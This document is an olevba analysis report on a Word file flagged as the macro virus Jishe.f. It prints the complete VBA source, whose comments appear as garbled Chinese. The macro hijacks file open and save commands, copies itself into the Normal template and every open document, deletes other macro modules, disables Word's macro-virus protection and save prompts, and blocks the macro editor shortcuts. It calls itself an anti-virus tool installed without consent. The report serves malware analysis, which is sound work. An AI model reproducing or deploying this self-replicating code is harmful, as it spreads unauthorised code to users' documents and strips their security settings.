olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Jishe.f-5aa214a43991c40d124bcec8695bed28421be930
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Jishe.f-5aa214a43991c40d124bcec8695bed28421be930 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO JiShenhua33.bas 
in file: Virus.MSWord.Jishe.f-5aa214a43991c40d124bcec8695bed28421be930 - OLE stream: 'Macros/VBA/JiShenhua33'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' ------------------------------------------------------------------------------------
' ³ÌÐòÉè¼Æ: ¼½É÷»ª  ½¨ÐÐÉ½¶«Ê¡·ÖÐÐ
' ÈÕÆÚ: 2001Äê3ÔÂ
' ¹¦ÄÜ: ¸Ã³ÌÐò°ÑWORD²Ëµ¥Óë¹¤¾ßÌõ³õÊ¼»¯µ½Ô­À´×´Ì¬²¢É¾³ý±¾Ä£¿éÒÔÍâµÄºêÄ£¿é.
'-------------------------------------------------------------------------------------
Const CurrentVersion = 33 '°æ±¾ºÅ
Const myName = "JiShenhua33" '±¾³ÌÐòÃû
Sub FileOpen()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileOpen).Show
    Call Immunize
End Sub
Sub FileSave()
On Error Resume Next
    Call Initialize
    Call Immunize
    If Not ActiveDocument.saved Then ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
    Call Initialize
    Call Immunize
    Dialogs(wdDialogFileSaveAs).Show
End Sub
Function IsNewDoc(myDoc As Document) As Boolean
    Dim rightPart As String
    If (Left(myDoc.Name, 2) = "ÎÄµµ") Then
        rightPart = Right(myDoc.Name, Len(myDoc.Name) - 2)
        If IsNumeric(rightPart) Then IsNewDoc = True Else IsNewDoc = False
    ElseIf (Left(myDoc.Name, 3) = "Doc") Then
        rightPart = Right(myDoc.Name, Len(myDoc.Name) - 3)
        If IsNumeric(rightPart) Then IsNewDoc = True Else IsNewDoc = False
    Else
        IsNewDoc = False
    End If
End Function
Function Immunize()
On Error Resume Next
    
    Dim ModuleName$, OpenDocImmunized As Boolean
    Dim i%, j%, NmImmunized As Boolean
    Dim myInt As Integer
    Dim openDoc As Document
    
    NmImmunized = False
    For i = NormalTemplate.VBProject.VBComponents.count To 1 Step -1
        ModuleName = NormalTemplate.VBProject.VBComponents(i).Name
        Select Case ModuleName
        Case "ThisDocument"
            myInt = NormalTemplate.VBProject.VBComponents(i).CodeModule.CountOfLines
            If myInt > 0 Then
                NormalTemplate.VBProject.VBComponents(i).CodeModule.DeleteLines 1, myInt
            End If
        Case "MyTools"
        Case "VirusReport", "JiShenhua" '¾É°æ±¾É±²¡¶¾³ÌÐò
            Application.OrganizerDelete _
                Source:=NormalTemplate.FullName, _
                Name:=ModuleName, _
                Object:=wdOrganizerObjectProjectItems
        Case Else
            If Left(ModuleName, 9) = "JiShenhua" Then '±¾³ÌÐò
                myInt = Val(Right(ModuleName, 2))
                If myInt < CurrentVersion Then 'µ±Ç°³ÌÐòµÄ¾É°æ±¾
                    Application.OrganizerDelete _
                        Source:=NormalTemplate.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                Else
                    NmImmunized = True 'ÊÇµ±Ç°°æ±¾»ò¸ü¸ß°æ±¾³ÌÐò
                End If
            Else 'ÆäËû³ÌÐò
                msg = "ÄãµÄ Word ÏµÍ³ÖÐ¸½´øÓÐºê³ÌÐòÄ£¿é " + ModuleName + _
                    ", ¼«ÓÐ¿ÉÄÜÊÇºê²¡¶¾,ÇëÑ¡Ôñ 'ÊÇ' Çå³ý¸Ã²¡¶¾."
                If MsgBox(msg, vbYesNo, "¼½É÷»ªÏòÄú±¨¸æ:") = vbYes Then
                    Application.OrganizerDelete _
                        Source:=NormalTemplate.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                End If
            End If
        End Select
    Next i
    
    For Each openDoc In Documents
        OpenDocImmunized = False
        For j = openDoc.VBProject.VBComponents.count To 1 Step -1
            ModuleName = openDoc.VBProject.VBComponents(j).Name
            Select Case ModuleName
                Case "ThisDocument"
                    myInt = openDoc.VBProject.VBComponents(j).CodeModule.CountOfLines
                    If myInt > 0 Then
                        openDoc.VBProject.VBComponents(j).CodeModule.DeleteLines 1, myInt
                    End If
                Case "Reference to Normal", "MyTools"
                Case "VirusReport", "JiShenhua" '¾É°æ±¾É±²¡¶¾³ÌÐò
                    Application.OrganizerDelete _
                        Source:=openDoc.FullName, _
                        Name:=ModuleName, _
                        Object:=wdOrganizerObjectProjectItems
                Case Else
                    If Left(ModuleName, 9) = "JiShenhua" Then '±¾³ÌÐò
                        myInt = Val(Right(ModuleName, 2))
                        If myInt < CurrentVersion Then 'µ±Ç°³ÌÐòµÄ¾É°æ±¾
                            Application.OrganizerDelete _
                                Source:=openDoc.FullName, _
                                Name:=ModuleName, _
                                Object:=wdOrganizerObjectProjectItems
                        Else
                            OpenDocImmunized = True 'ÊÇµ±Ç°°æ±¾»ò¸ü¸ß°æ±¾³ÌÐò
                        End If
                    Else 'ÓÐÆäËûÄ£¿é´æÔÚ
                        msg = "ÄúµÄÎÄ¼þ <" + openDoc.Name + "> ÖÐ¸½´øÓÐ Word ºêÄ£¿é " + ModuleName + _
                            ", ¼«ÓÐ¿ÉÄÜÊÇºê²¡¶¾,ÇëÑ¡Ôñ 'ÊÇ' Çå³ý¸Ã²¡¶¾."
                        If MsgBox(msg, vbYesNo, "¼½É÷»ªÏòÄú±¨¸æ:") = vbYes Then
                            Application.OrganizerDelete _
                                Source:=openDoc.FullName, _
                                Name:=ModuleName, _
                                Object:=wdOrganizerObjectProjectItems
                        End If
                    End If
            End Select
        Next j
        'Ïò´ò¿ªµÄÎÄµµÖÐÐ´Èë±¾³ÌÐò
        If Not OpenDocImmunized Then
            Application.OrganizerCopy Source:=NormalTemplate.FullName, _
                Destination:=openDoc.FullName, Name:=myName, _
                Object:=wdOrganizerObjectProjectItems
            If (Not IsNewDoc(openDoc)) And (Not openDoc.saved) Then
                openDoc.Save
            End If
        End If
    Next openDoc
    'ÏòNormalÖÐÐ´Èë±¾³ÌÐò
    If Not NmImmunized Then
        Application.OrganizerCopy _
            Source:=ActiveDocument.FullName, _
            Destination:=NormalTemplate.FullName, _
            Name:=myName, _
            Object:=wdOrganizerObjectProjectItems
        If Not NormalTemplate.saved Then NormalTemplate.Save
    End If
End Function
Function Initialize()
On Error Resume Next
   
   Application.DisplayAlerts = wdAlertsAll
   WordBasic.DisableAutoMacros 1
   
    With Application
        .UserAddress = "¼½É÷»ªÒÑÎªÄúµÄ»úÆ÷°²×°ÁË·´ºê²¡¶¾³ÌÐò(v33),ÊÂÇ°Î´Õ÷ÇóÄúµÄÍ¬Òâ,Çë¼ûÁÂ."
    End With
    
    With Dialogs(wdDialogFileSummaryInfo)
        .Comments = "¸ÃÎÄ¼þ¸½´øÓÐ¼½É÷»ª±àÐ´µÄ·´ºê²¡¶¾³ÌÐò(v33)."
        .Execute
    End With
    
    With Options
        .ConfirmConversions = True
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    
    With ActiveDocument
        .ReadOnlyRecommended = False
    End With
    
   With CommandBars("Visual Basic")
      .Enabled = True
      .Protection = msoBarTypeMenuBar
      .Protection = msoBarMenuBar
   End With
   
   With CommandBars("Tools")
      .Reset
      .Controls("Macro").Reset
      .Controls("Customize...").Reset
   End With
   
   FindKey(BuildKeyCode(wdKeyF11, wdKeyAlt)).Clear
   FindKey(BuildKeyCode(wdKeyF8, wdKeyAlt)).Clear
   CustomizationContext = NormalTemplate
End Function
Sub CheckAllFiles()
    
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

